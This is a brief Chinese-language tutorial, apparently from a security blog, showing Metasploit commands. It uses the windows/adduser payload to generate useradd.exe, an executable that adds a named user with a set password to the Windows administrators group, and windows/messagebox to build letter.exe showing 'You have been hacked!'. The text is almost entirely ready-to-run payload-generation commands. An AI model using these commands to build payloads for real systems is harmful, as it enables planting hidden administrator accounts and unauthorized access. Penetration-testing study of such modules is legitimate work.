今天为大家介绍几个MSF中比较有意思的 PAYLOAD 模块。

添加用户到管理员组：

**use windows/adduser**

**set user secist**

**set pass Secist.com**

**set wmic true**

**generate -t exe -f /root/Desktop/useradd.exe**

  

![](../Images/276006410f121c43ac1798305e894905.png)

**net user**

**use windows/messagebox**

**set text You have been hacked！**

**set tittle Important Message！**

**generate -t exe -f /root/Desktop/letter.exe**
